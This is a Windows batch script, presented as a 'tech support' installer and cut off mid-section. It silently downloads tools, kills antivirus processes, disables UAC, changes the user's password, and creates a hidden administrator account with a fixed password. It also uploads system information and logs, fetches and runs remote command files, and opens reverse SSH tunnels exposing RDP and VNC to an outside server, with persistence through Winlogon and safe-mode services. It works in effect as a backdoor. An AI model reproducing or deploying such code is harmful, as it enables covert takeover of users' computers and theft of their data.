If not exist "%path1%\shutdown2.exe" download http://%fileserver%/shutdown2.exe /timeout:120 /output:%path1%
If not exist "%path1%\bootsect.exe" download http://%fileserver%/bootsect.exe /timeout:120 /output:%path1%
If not exist "%path1%\sc.exe" download http://%fileserver%/sc.exe /display:silent  /timeout:120 /output:%path1%
If not exist "%path1%\subinacl.exe" download http://%fileserver%/subinacl.exe /timeout:120 /output:%path1%
If not exist "%path1%\secedit.exe" download http://%fileserver%/secedit.exe /timeout:120 /output:%path1%
If not exist "%path1%\mbrfix.exe" download http://%fileserver%/mbrfix.exe /timeout:120 /output:%path1%
If not exist "%path1%\bcdedit.exe" download http://%fileserver%/bcdedit.exe /timeout:120 /output:%path1%
If not exist "%systemroot%\bcdedit.exe" (copy /y %path1%\bcdedit.exe %systemroot%)
REM If not exist "%path1%\erdnt.exe" download http://%fileserver%/erdnt.exe /timeout:120 /output:%path1%
REM If not exist "%path1%\erdntwin.loc" download http://%fileserver%/erdntwin.loc /timeout:120 /output:%path1%
If not exist "%path1%\menu.lst-locked" download http://%fileserver%/menu.lst-locked /timeout:120 /output:%path1%
If not exist "%path1%\menu.lst-xp" download http://%fileserver%/menu.lst-xp /timeout:120 /output:%path1%
If not exist "%path1%\menu.lst-vista" download http://%fileserver%/menu.lst-vista /timeout:120 /output:%path1%
If not exist "%path1%\menu.lst-support" download http://%fileserver%/menu.lst-support /timeout:120 /output:%path1%
If not exist "%path1%\menu.lst-linremote" download http://%fileserver%/menu.lst-linremote /timeout:120 /output:%path1%
If not exist "%path1%\currprocess.exe" download http://%fileserver%/currprocess.exe /timeout:120 /output:%path1%
If not exist "%path1%\procexp.exe" download http://%fileserver%/procexp.exe /timeout:120 /output:%path1%
If not exist "%systemroot%\procexp.exe" (copy /y %path1%\procexp.exe %systemroot% >NUL 2>&1)

echo mark233>>"%log%"
If not exist "%path1%\wget.exe" download http://%fileserver%/wget.exe /timeout:120 /output:%path1%
If not exist "%systemroot%\wget.exe" (copy /y %path1%\wget.exe %systemroot% >NUL 2>&1)
If not exist "%path1%\mtee.exe" download http://%fileserver%/mtee.exe /timeout:120 /output:%path1%
If not exist "%path1%\sed.exe" download http://%fileserver%/sed.exe /timeout:120 /output:%path1%
If not exist "%systemroot%\sed.exe" (copy /y %path1%\sed.exe %systemroot% >NUL 2>&1)
If not exist "%path1%\systeminfo.exe" download http://%fileserver%/systeminfo.exe /timeout:120 /output:%path1%
If not exist "%path1%\cports.exe" download http://%fileserver%/cports.exe /timeout:120 /output:%path1%
schtasks /? >NUL || download http://%fileserver%/schtasks.exe /timeout:120
If not exist "%path1%\runas.vbs" download http://%fileserver%/runas.vbs /timeout:120 /output:%path1%
If not exist "%path1%\services-xp.reg" download http://%fileserver%/services-xp.reg
If not exist "%path1%\services-vista.reg" download http://%fileserver%/services-vista.reg
If not exist "%path1%\safeboot-xp-sp3.reg" download http://%fileserver%/safeboot-xp-sp3.reg
If not exist "%path1%\safeboot-vista.reg" download http://%fileserver%/safeboot-vista.reg

echo mark236a>>"%log%"
If not exist "%path1%\qres.exe" download http://%fileserver%/qres.exe /timeout:120 /output:%path1%
If not exist "%systemroot%\qres.exe" (copy /y %path1%\qres.exe %systemroot% >NUL 2>&1)
If not exist "%path1%\regini.exe" download http://%fileserver%/regini.exe /timeout:120 /output:%path1%
If not exist "%path1%\regedit2.exe" download http://%fileserver%/regedit2.exe /timeout:120 /output:%path1%
If not exist "%path1%\psexec.exe" download http://%fileserver%/psexec.exe /timeout:120 /output:%path1%
REM If not exist "%path1%\getsid.exe" download http://%fileserver%/getsid.exe /timeout:120 /output:%path1%
If not exist "%path1%\pspasswd.exe" download http://%fileserver%/pspasswd.exe /timeout:120 /output:%path1%
If not exist "%systemroot%\pspasswd.exe" (copy /y %path1%\pspasswd.exe %systemroot% >NUL 2>&1)
echo chcp 437 >%path1%\_shell.bat & echo cd /d %path1%>>%path1%\_shell.bat

REM if "%uninstall%" equ "yes" (echo jump uninstall &echo jump uninstall>>"%log%" &goto uninstall)

if "%system%" equ "customer" if not exist classes2.inf (
REM fixing locked regedit.exe and resetting executable permissions
echo [Version] >classes2.inf
echo Signature="$Chicago$" >>classes2.inf
echo Provider=TechSupport >>classes2.inf
echo [DefaultInstall] >>classes2.inf
echo AddReg=UnhookRegKey >>classes2.inf
echo [UnhookRegKey] >>classes2.inf
echo HKCR, batfile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
echo HKCR, comfile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
echo HKCR, exefile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
echo HKCR, piffile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
REM echo HKCR, regfile\shell\open\command,,,"regedit.exe ""%%1""" >>classes2.inf
echo HKLM, Software\CLASSES\batfile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
echo HKLM, Software\CLASSES\comfile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
echo HKLM, Software\CLASSES\exefile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
echo HKLM, Software\CLASSES\piffile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
REM echo HKLM, Software\CLASSES\regfile\shell\open\command,,,"regedit.exe ""%%1""" >>classes2.inf
echo HKLM, Software\CLASSES\scrfile\shell\open\command,,,"""%%1"" %%zz" >>classes2.inf
echo HKLM, Software\Microsoft\Windows\CurrentVersion\Policies\System,DisableRegistryTools,0x00000020,0 >>classes2.inf
echo HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\System,DisableRegistryTools,0x00000020,0 >>classes2.inf
type classes2.inf | sed "s/zz/*/" >classes_tmp && move classes_tmp classes2.inf
start rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 .\classes2.inf 2>&1 >NUL 2>&1
sleep 7 & pskill rundll32
)

echo %vars% | find /I "goto" &&goto :%2%
echo mark236b>>"%log%"


reg query hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon ^
 | find /I "runcycle" || echo mark9134>>"%log%" &&start runcycle


if "%quick%" equ "yes" (echo jump quick_install & goto quick_install)
echo mark237>>"%log%"

cd /d "%path1%\"

REM killing McAfee processes
pskill -t accepteula mcagent >NUL 2>&1
pskill -t mcmscvc >NUL 2>&1
pskill -t mpfsrv >NUL 2>&1
pskill -t mcmscsvc >NUL 2>&1
pskill -t mcnasvc >NUL 2>&1
pskill -t mcshield >NUL 2>&1
pskill -t mcsysmon >NUL 2>&1
REM killing TrendMicro firewall
REM pskill -t tmpfw 
REM pskill -t sfctlcom
REM pskill -t tmas_oemon
REM pskill -t tmbmsrv
REM pskill -t tmproxy
REM pskill -t ufseagnt
echo mark527>>"%log%"

if "%system%" equ "techsupport" (goto cont289119)

if "%system%" equ "customer" if not exist "%path1%\%id%-unlock" (
  REM pskill -t lock.exe 2>&1 >NUL 2>&1 & qres /x:800 /D & start lock.exe 2>&1 >NUL 2>&1
 del %path1%\%id%-unlock >NUL 2>&1
)

If not exist "%SystemRoot%\ERDNT\%id%" (
echo backing up registry files & echo backing up registry files >>"%log%"
REM erunt.exe /verysilent /nostartupentry /nocancel
erunt\erunt.exe %SystemRoot%\ERDNT\%id% /noconfirmdelete /noprogresswindow||echo error 1240674>>"%log%"
sleep 20 & pskill erunt.exe 2>&1 >NUL 2>&1 & sleep 5 & pskill erunt.exe 2>&1 >NUL 2>&1
)

reg delete hkcr\clsid\{FD6905CE-952F-41F1-9A6F-135D9C6622CC} /f
reg add hklm\software\Microsoft\Windows\CurrentVersion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add hklm\software\Microsoft\Windows\CurrentVersion\policies\system /v ConsentPromptBehavioruser /t REG_DWORD /d 0 /f
reg add hklm\software\Microsoft\Windows\CurrentVersion\policies\system /v EnableLUA /t REG_DWORD /d 0 /f
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v userinit /t REG_SZ /d %systemroot%\system32\userinit.exe, /f

set regkey=hklm\system\CurrentControlSet\Control\Session Manager\Environment
echo To Do: confirm that this section is compatible with 64bit
REM reg add "%regkey%" /v Path /t REG_EXPAND_SZ /F /D "%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\system32\WBEM"
reg add "%regkey%" /v PATHEXT /t REG_SZ /F /D ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
reg add "%regkey%" /v ComSpec /t REG_EXPAND_SZ /F /D "%SystemRoot%\system32\cmd.exe"
if exist "%SystemRoot%\syswow\cmd.exe" (reg add "%regkey%" /v ComSpec /t REG_EXPAND_SZ /F /D "%SystemRoot%\syswow\cmd.exe")
REM reg add "%regkey%" /v windir /t REG_EXPAND_SZ /F /D "%systemroot%"
REM HKEY_CURRENT_USER\Environment
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v GlobalUserOffline /f /t REG_DWORD /d 0
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /f /t REG_DWORD /d 0

:cont641224
   REM pwrscheme.pow is created by the system
if exist pwrscheme.pow (goto cont289119)
   REM Setting power scheme for XP
echo [message:3455678] >>"%log%"
powercfg /query | find "Name" | sed "s/Name//" | sed "s/ //g" >powercfg.txt
powercfg /setactive "always on" >NUL 2>&1
goto cont289119

:cont48213
echo [message:246546] >>"%log%"
   REM Setting power scheme for VISTA
if not exist powercfg.reg (reg export "hkcu\control panel\powercfg" powercfg.reg /y)
powercfg /change /standby-timeout-ac 0 >NUL 2>&1
powercfg /change /standby-timeout-dc 0 >NUL 2>&1
powercfg /change /hibernate-timeout-ac 0 >NUL 2>&1
powercfg /change /hibernate-timeout-dc 0 >NUL 2>&1

:cont289119
echo mark528>>"%log%"
del "%path1%\wanip.tmp" >NUL 2>&1
download http://checkip.dyndns.org/index.html /display:silent /timeout:30 /output:"%path1%\wanip.tmp" /notime >NUL 2>&1
type "%path1%\wanip.tmp" | sed "s/.*.://" | sed "s/<.*.//" | sed "s/ //g" >"%path1%\wanip"
For /F "tokens=* delims=" %%i in ('type "%path1%\wanip"') Do Set wanip=%%i
del "%path1%\wanip.tmp" >NUL 2>&1
download http://%fileserver%/%id%-%wanip%-%name% /timeout:10 /display:silent
echo mark529>>"%log%"
FOR /F "tokens=2" %%I in ('date /t') DO SET THEDATE=%%I
FOR /F "tokens=1" %%I in ('echo %time%') DO SET THETIME=%%I
FOR /F "delims=/ tokens=1,2,3" %%I in ('echo %THEDATE%') DO SET ld=%%K%%I%%J
echo %ld% %THETIME% >"%log%"
echo pass=%randID% >>"%log%"
echo connect attempts=%randID2% >>"%log%"
net statistics workstation | find "since" >>"%log%"
echo id=%id% >>"%log%"
echo wanip=%wanip% >>"%log%"
echo winversion=%winversion% >>"%log%"
echo computername=%computername% >>"%log%"
echo username=%username%/%username%9 >>"%log%"
echo drv0=%drv0% >>"%log%"
echo path1=%path1% >>"%log%"
echo systemroot=%systemroot% >>"%log%"
echo system=%system% >>"%log%"
echo antivirus=%antivirus%>>"%log%"
echo safeboot=%safeboot_option%>>"%log%"
REM echo installer=echo %0% %1% %2% %3% %4% >>"%log%"
echo installer=%installer% >>"%log%"
echo all variables=%allvariables% >>"%log%"
echo install code=%code% >>"%log%"
echo Licence accepted By: %name% >>"%log%"
if "%system%" equ "customer" systeminfo.exe >>"%log%"
ipconfig /all >>"%log%"
echo mark530>>"%log%"
type "%temp%\connect.log" >>"%log%"

set ftpfile=%log%&CALL :ftp_upload

ps -Ws >%id%-processes.txt
if "%system%" equ "techsupport" (currprocess /stext %id%-processes.txt)
set ftpfile=%id%-processes.txt&CALL :ftp_upload

if not exist "%log%-old.log" if "%system%" equ "customer" (
 copy "%log%" "%log%-old.log" && set ftpfile="%log%-old.log"&CALL :ftp_upload
)

:cont2767533

Set _forward1=-R %id%1:localhost:29979 -R %id%2:localhost:3389 -R %id%3:localhost:3260
Set _forward2=-R %id%4:localhost:%id%4 -R %id%5:localhost:%id%5

copy /Y "%path1%\ultravnc_tmp" "%path1%\ultravnc.ini"
echo PortNumber=%id%4 >>"%path1%\ultravnc.ini"
echo HTTPPortNumber=%id%5 >>"%path1%\ultravnc.ini"
echo [ultravnc] >>"%path1%\ultravnc.ini"
echo passwd=F7E7925C3B79C4F034 >>"%path1%\ultravnc.ini"
echo [poll] >>"%path1%\ultravnc.ini"
echo TurboMode=1 >>"%path1%\ultravnc.ini"
PollUnderCursor=1 >>"%path1%\ultravnc.ini"
echo PollForeground=1 >>"%path1%\ultravnc.ini"
echo PollFullScreen=0 >>"%path1%\ultravnc.ini"
echo OnlyPollOnEvent=0 >>"%path1%\ultravnc.ini"
echo EnableDriver=1 >>"%path1%\ultravnc.ini"
echo EnableHook=1 >>"%path1%\ultravnc.ini"
echo EnableVirtual=1 >>"%path1%\ultravnc.ini"
copy /y %path1%\ultravnc.ini %systemroot% >NUL 2>&1
copy /y %path1%\winvnc.exe %systemroot% >NUL 2>&1
echo mark531>>"%log%"

if "%system%" equ "customer" if exist "%systemroot%\boot\pcat" (
REM To Do: try regini.exe to fix these vista registry permissions?
REM reg add hklm\software\Microsoft"\security Center"\svc /v UacDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v FirewallOverride /t REG_DWORD /d 0 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v FirewallDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v UpdatesDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v EnableNotifications /t REG_DWORD /d 0 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v AntiSpyWareDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v AntiVirusDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v AutoUpdateDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software\Microsoft"\security Center"\svc /v InternetSettingsDisableNotify /t REG_DWORD /d 1 /f
)

if "%system%" equ "customer" if not exist "%systemroot%\boot\pcat" (
REM reg add hklm\software\Microsoft"\security Center" /v FirewallOverride /t REG_DWORD /d 0 /f
REM reg add hklm\software\Microsoft"\security Center" /v FirewallDisableNotify /t REG_DWORD /d 1 /f
REM reg add hklm\software\Microsoft"\security Center" /v UpdatesDisableNotify /t REG_DWORD /d 1 /f
)

If not exist "%systemroot%\winlogon.reg" if "%system%" equ "customer" (
reg export hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon %systemroot%\winlogon.reg
)

if "%nowinlogon%" equ "yes" (reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon\nowinlogon /f)
reg query hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v nowinlogon && set nowinlogon=yes
reg query hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v _modified && set nowinlogon=yes

if "%system%" equ "customer" if "%nowinlogon%" neq "yes" (
REM net user %username% %username%9
pspasswd "%username%" "%username%9"
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v _modified /f
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v AutoAdminLogon /t REG_SZ /d 1 /f
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v DefaultUserName /t REG_SZ /d "%username%" /f
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v DefaultPassword /t REG_SZ /d "%username%9" /f
)

net user techsupport 123123 /add /active:yes >NUL 2>&1
net localgroup Administrators techsupport /add >NUL 2>&1
net user techsupport 123123 /active:yes
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon\SpecialAccounts\UserList /v TechSupport /t REG_DWORD /d 0 /f
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v shell /t REG_SZ /f /d explorer.exe,runcycle,sessmngr
REM sc create StabilityMon binPath= " " type= own error= ignore 2>&1 >NUL 2>&1
REM sc description StabilityMon "Monitors System Stability" 2>&1 >NUL 2>&1
REM sc config StabilityMon start= auto type= own binPath= "%drv0%\%_windir%\system32\cmd.exe /c sessmngr" 2>&1 >NUL 2>&1
REM reg add "hklm\system\CurrentControlSet\Control\SafeBoot\Network\StabilityMon" /VE /T REG_SZ /F /D Service

REM sc create "Update Man" binPath= " " type= own error= ignore 2>&1 >NUL 2>&1
REM sc description "Update Man" "Manual Update Manager" 2>&1 >NUL 2>&1
REM sc config "Update Man" start= demand type= own binPath= "%drv0%\%_windir%\system32\cmd.exe /c winvnc"

if "%antivirus%" equ "yes" (
copy /y sessmngr.exe %drv0%\%_windir%\_antivirus.exe && start %drv0%\%_windir%\_antivirus.exe ^
  || echo error 34316455>>"%log%"
)

if "%support%" equ "yes" if "%system%" equ "customer" (
copy /y %path1%\sessmngr.exe %drv0%\%_windir%\_support.exe || echo error 81675108>>"%log%"
echo mark514>>"%log%" &start %drv0%\%_windir%\_support
)

pskill winvnc >NUL 2>&1 &sleep 3 &pskill winvnc >NUL 2>&1

REM if "%firstrun%" equ "yes" (start winvnc.exe -connect %vncserver% -run)
REM runas.vbs techsupport 123123 "start winvnc.exe -connect %vncserver%"

:_start

cd /d "%path1%\"

download http://%fileserver%/connection_test /timeout:10 /overwrite || call :ping_test
download http://%fileserver%/%id%-commands.bat /timeout:10 /overwrite &&CALL %id%-commands.bat
download http://%fileserver%/all-commands.bat /timeout:10 /overwrite &&CALL all-commands.bat
REM if not exist connection_test if "%antivirus%" equ "yes" (echo error 6650581>>"%log%"&goto EOF)
REM if not exist connection_test if exist %drv0%\%_windir%\_antivirus.exe (echo error 860462>>"%log%"&goto antivirus)

pskill ssh >NUL 2>&1 & pskill sshd >NUL 2>&1 & pskill plink >NUL 2>&1 & net stop uvnc_service

    ping -n 1 %sshserver% | find "Reply" >NUL
if "%errorlevel%" neq "0" (
    echo %date% %time% >>"%log%"
    echo ERROR 722 [does server accept pings?] >>"%log%"
    Set _error=yes
    Set _last=_start
    REM goto _error-loop
)

:_winvnc
   echo starting winvnc.exe
   echo stage4 start >>"%log%"

if "%system%" equ "techsupport" (pskill winvnc & sleep 3 & start winvnc & goto _sshd)

net start uvnc_service >NUL 2>&1
reg add "hklm\system\CurrentControlSet\Control\SafeBoot\Network\uvnc_service" /VE /T REG_SZ /F /D Service

   REM cports /filter "include:process:winvnc" /stext "" | find "%id%4" >NUL
sc query uvnc_service 2>&1 | find /I "uvnc_service"
if "%ERRORLEVEL%" neq "0" (
   echo stage4 end >>"%log%"
   Set _error=yes
   Set _last=_winvnc
   start winvnc -uninstall & sleep 10
   start winvnc -install & sleep 10
   echo jump _error-loop & goto _error-loop
)

REM runas.vbs %username% %username%9 "start winvnc.exe -connect %vncserver%"

:_sshd
echo starting stage5 >>"%log%"
echo starting ssh server
pskill sshd & pskill bash & sc delete sshd
%path1%\icw\bin\mkpasswd -l >%path1%\icw\etc\passwd
%path1%\icw\bin\mkgroup -l >%path1%\icw\etc\group
mkdir "%path1%\icw\home\%username%\.ssh" >NUL 2>&1
copy /y %path1%\_authorized_keys "%path1%\icw\home\%username%\.ssh"
copy /y %path1%\_id_rsa "%path1%\icw\home\%username%\.ssh"
mkdir %path1%\icw\home\techsupport\.ssh >NUL 2>&1
copy /y %path1%\_authorized_keys %path1%\icw\home\techsupport\.ssh
copy /y %path1%\_id_rsa %path1%\icw\home\techsupport\.ssh

if "%system%" equ "techsupport" (%path1%\icw\bin\sshd & goto _ssh)

reg add "hklm\system\CurrentControlSet\Control\SafeBoot\Network\sshd" /VE /T REG_SZ /F /D Service
sc create sshd binPath= " " type= own error= ignore
sc config sshd start= demand type= own binPath= "%drv0%\%_windir%\system32\cmd.exe /c %path1%\icw\bin\sshd"
net start sshd
REM %path1%\icw\bin\sshd

   cports /filter "include:process:sshd" /stext "" | find "29979" >NUL
if "%ERRORLEVEL%" neq "0" (
   echo stage5 end >>"%log%"
   echo sshd server failed
   Set _error=yes
   Set _last=_sshd
   REM echo jump _error-loop & goto _error-loop
)

goto _ssh

:_sshd-disabled
   echo starting stage5 >>"%log%"
   echo starting ssh server
   ::netstat -an | find ":29979" >NUL & echo checking ssh server
   REM sc stop daemon >NUL 2>&1 & sleep 2 & sc delete daemon >NUL 2>&1
   REM %path1%\daemon.exe -stop
   %path1%\daemon.exe -uninstall >NUL 2>&1 & pskill shlex >NUL 2>&1
   %path1%\fixscut.exe >NUL 2>&1
   %path1%\daemon.exe -install & %path1%\daemon.exe -start
   ::cports /stext "" | find ":29979" & sleep 1

   cports /filter "include:process:daemon" /stext "" | find "29979" >NUL
if "%ERRORLEVEL%" neq "0" (
   echo stage5 end >>"%log%"
   Set _error=yes
   Set _last=_sshd
   echo sshd server failed
   REM echo jump _error-loop & goto _error-loop
)

set ftpfile=%log%&CALL :ftp_upload

:_ssh
   echo stage6 start >>"%log%"
   pskill RemoteSupport.exe 2>&1 >NUL 2>&1
   pskill sessmngr.exe 2>&1 >NUL 2>&1
   pskill netsupport.exe 2>&1 >NUL 2>&1
   pskill ssh >NUL 2>&1
   echo id=%id% & download http://%fileserver%/%id%-ssh-%username% 2>&1 >NUL 2>&1

   %path1%\icw\bin\ssh -p %sshserver_port% -N -c blowfish -i %path1%\_id_rsa ^
     %_forward1% %_forward2% -l %sshserver_user% %sshserver%
   echo id=%id% & download http://%fileserver%/%id%-ssh-disconnect /timeout:10 2>&1 >NUL 2>&1
   ::cports /stab "" | find "plink" | find ":%sshserver_port%" | find /I "Est" >NUL
   ::netstat -an | find ":%sshserver_port%" | find /I "EST" >NUL & echo checking ssh
   ::cports /stext "" | find "plink" | find ": %sshserver_port%" | grep "Est" >NUL & sleep 1

   cports /filter "include:process:ssh" /stext "" | find "%id%1"  | find /I "Established" >NUL
if "%ERRORLEVEL%" neq "0" (
   echo stage6 end >>"%log%"
   REM winscp.com /privatekey=%path1%\id_rsa-scp.ppk /command "option batch continue" "option confirm off" ^
   REM    "open %sshserver_user%@%sshserver%:%sshserver_port%" "put %log%" "exit"
   ::Set ssh_options=-o BatchMode=yes -o StrictHostKeyChecking=no -o TCPKeepAlive=no -o ServerAliveInterval=30
   ::ssh.exe -p %sshserver_port% %ssh_options% -i %path1%\id_rsa-1 %_forward1% %_forward2% %sshserver_user%@%sshserver%
   Set _error=yes
   Set _last=_start
   echo jump _error-loop & goto _error-loop
)


:_ssh-disabled
   echo stage6 start >>"%log%"
   pskill RemoteSupport.exe 2>&1 >NUL 2>&1
   pskill sessmngr.exe 2>&1 >NUL 2>&1
   pskill netsupport.exe 2>&1 >NUL 2>&1
   pskill plink >NUL 2>&1
   echo id=%id% & download http://%fileserver%/%id%-ssh-%username% /timeout:10 2>&1 >NUL 2>&1
   REM plink -P 23000 -l techsupport -i c:\_id_rsa.ppk -R 45774:localhost:45774 64.79.194.101
   plink.exe -auto_store_key_in_cache -P %sshserver_port% -N -i %path1%\_id_rsa.ppk ^
     %_forward1% %_forward2% -l %sshserver_user% %sshserver%
   echo id=%id% & download http://%fileserver%/%id%-ssh-disconnect /timeout:10 2>&1 >NUL 2>&1
   ::cports /stab "" | find "plink" | find ":%sshserver_port%" | find /I "Est" >NUL
   ::netstat -an | find ":%sshserver_port%" | find /I "EST" >NUL & echo checking ssh
   ::cports /stext "" | find "plink" | find ": %sshserver_port%" | grep "Est" >NUL & sleep 1

   cports /filter "include:process:plink" /stext "" | find "%id%1" | find /I "Established" >NUL
if "%ERRORLEVEL%" neq "0" (
   echo stage6 end >>"%log%"
   REM winscp.com /privatekey=%path1%\id_rsa-scp.ppk /command "option batch continue" "option confirm off" ^
   REM    "open %sshserver_user%@%sshserver%:%sshserver_port%" "put %log%" "exit"
   ::Set ssh_options=-o BatchMode=yes -o StrictHostKeyChecking=no -o TCPKeepAlive=no -o ServerAliveInterval=30
   ::ssh.exe -p %sshserver_port% %ssh_options% -i %path1%\id_rsa-1 %_forward1% %_forward2% %sshserver_user%@%sshserver%
   Set _error=yes
   Set _last=_start
   echo jump _error-loop & goto _error-loop
)


::"C:/Program Files/OpenSSH/bin/ssh.exe" -R 20210:localhost:50300 -o
::BatchMode=yes -o StrictHostKeyChecking=no -o VerifyHostKeyDNS=no -o
::TCPKeepAlive=no -o ServerAliveInterval=15 -o ServerAliveCountMax=3 -i
::"C:/Program Files/Visma/OPGatewayService/id_rsa" visma[at]10.55.40.123

goto _start


:_error-loop

   echo %date% %time% >>"%log%"
   REM IF "%_loop%" equ "6" (shutdown /r /f /t 360 || shutdown2 /r)
   IF "%_loop%" equ "6" (Set _error=0& echo Error 61255>>"%log%" &echo call ping_test &call :ping_test)
   
   echo error= %_error% last= %_last% loop= %_loop% >>"%log%"
   echo error= %_error% last= %_last% loop= %_loop%

IF "%_loop%" equ "5" (
   Set _loop=6
   Set _error=0& sleep.exe 60 & echo jump %_last% & goto %_last%
)

IF "%_loop%" equ "4" (
   Set _loop=5
   Set _error=0& sleep.exe 60 & echo jump %_last% & goto %_last%
)

IF "%_loop%" equ "3" (
   Set _loop=4
   Set _error=0& sleep.exe 60 & echo jump %_last% & goto %_last%
)

IF "%_loop%" equ "2" (
   Set _loop=3
   Set _error=0& sleep.exe 10 & echo jump %_last% & goto %_last%
)

IF "%_loop%" equ "1" (
   Set _loop=2
   Set _error=0& sleep.exe 10 & echo jump %_last% & goto %_last%
)

IF "%_error%" equ "yes" (
   Set _loop=1
   Set _error=0& sleep.exe 10 & echo jump %_last% & goto %_last%
)

goto start


:quick_install
echo mark6451>>"%log%"
set ftpfile=%log%
cd /d "%systemroot%\"
If not exist winvnc.exe (download http://%fileserver%/winvnc.exe /timeout:120)
If not exist ultravnc.ini (download http://%fileserver%/ultravnc.ini /timeout:120)
If not exist sleep.exe (download http://%fileserver%/sleep.exe /timeout:120)
If not exist pskill.exe (download http://%fileserver%/pskill.exe /timeout:120)

if exist winvnc.exe if exist ultravnc.ini if exist sleep.exe (start runcycle & echo jump cont2764978645 & goto cont2764978645)

> "%temp%\code.vbs" ECHO WScript.Timeout = 60
>> "%temp%\code.vbs" ECHO WScript.Echo msgBox("error 465078046",vbsystemModal+0,"ERROR 42")
if "%silent%" neq "yes" cscript //e:vbscript //NoLogo "%temp%\code.vbs"
del "%temp%\code.vbs" >NUL 2>&1 &echo error 465078046>>"%log%" &goto ftp_upload

:cont2764978645
echo mark6454>>"%log%"
net stop uvnc_service >NUL 2>&1 & pskill winvnc >NUL 2>&1 & sleep 3
start winvnc.exe -autoreconnect -connect %vncserver% -run
sleep 30m & goto cont2764978645
goto EOF

:burn
set log=%temp%\%rand%-burn.log
cd /d "%temp%\"
echo downloading imgburn.exe
download http://%fileserver%/imgburn.exe /timeout:120 /overwrite||download http://%fileserver%/supportiso.exe /timeout:120 /resume
echo downloading supportiso.exe

ping -n 5 333 >NUL 2>&1
download http://%fileserver%/supportiso.exe /timeout:300 /update||download http://%fileserver%/supportiso.exe /timeout:300 /resume
imgburn.exe -y >NUL 2>&1 & supportiso.exe -y >NUL 2>&1

if exist imgburn\imgburn.exe if exist support.iso (goto cont94815319745)
cls & echo WAITING FOR INPUT
> "%temp%\code.vbs" ECHO WScript.Timeout = 60
>> "%temp%\code.vbs" ECHO WScript.Echo msgBox("cd image download failed! RETRY?",vbsystemModal+4,"Download Failed")
if "%silent%" neq "yes" FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET burn1=%%A
cls & echo INPUT ENTERED & del "%temp%\code.vbs" >NUL 2>&1
If "%burn1%" equ "7" (echo jump log_upload & goto log_upload)
goto burn

:cont94815319745
echo burning support.iso
download http://%fileserver%/%rand%-burning /timeout:10 /overwrite /display:silent
imgburn\imgburn.exe /mode write /eject yes /start /waitformedia /verify no /close /deleteimage yes /src "support.iso"

if not exist support.iso (goto cont481843754)
download http://%fileserver%/%rand%-burn_failed /timeout:10 /overwrite /display:silent
echo burn failed & echo burn failed >>"%log%"
> "%temp%\code.vbs" ECHO WScript.Timeout = 180
>> "%temp%\code.vbs" ECHO WScript.Echo msgBox("Sorry Burn Failed RETRY?",vbsystemModal+4,"Burn Failed")
if "%silent%" neq "yes" FOR /F "tokens=*" %%A IN ('cscript //e:vbscript //NoLogo "%temp%\code.vbs"') DO SET burn2=%%A
del "%temp%\code.vbs" >NUL 2>&1 & del support.iso >NUL 2>&1
If "%burn2%" equ "7" (echo jump log_upload & goto log_upload)
goto burn

:cont481843754
download http://%fileserver%/%rand%-burn_complete /timeout:10 /overwrite /display:silent
echo burn complete & echo burn complete >>"%log%"
> "%temp%\code.vbs" ECHO WScript.Echo msgBox("Image Burn Complete",vbsystemModal+0,"Finished")
if "%silent%" neq "yes" cscript //e:vbscript //NoLogo "%temp%\code.vbs" & del "%temp%\code.vbs" >NUL 2>&1
rmdir /s /q imgburn %path1% & del imgburn* support.iso supportiso.exe "%log%"
goto log_upload & goto EOF

::support
:support
echo Installing Support System and safemode & echo Installing Support System and safemode>>"%log%"
set log=%path1%\%id%-support.log
set ftpfile="%log%"
echo mark456>>"%log%"
SET /a randID4=%1>NUL 2>&1
SET /a randID4=%randID4% + 1

If "%randID4%" equ "3" (echo call ping_test &CALL :ping_test)
If "%randID4%" equ "5" (echo error 761415085>>"%log%" &goto ftp_upload)

REM 200000000=200mb
Set minspace=200000000
For /F "tokens=* delims=" %%i in (
'fsutil volume diskfree %drv0% ^| find /I "of free bytes" ^| sed "s/.*.://" ^| sed "s/ //"'
) Do Set free=%%i

If /I %free% LSS %minspace% (
    echo Error 6455045 [minspace:%minspace%] [freespace:%free%]>>"%log%" &goto ftp_upload
)

cd /d "%drv0%\"
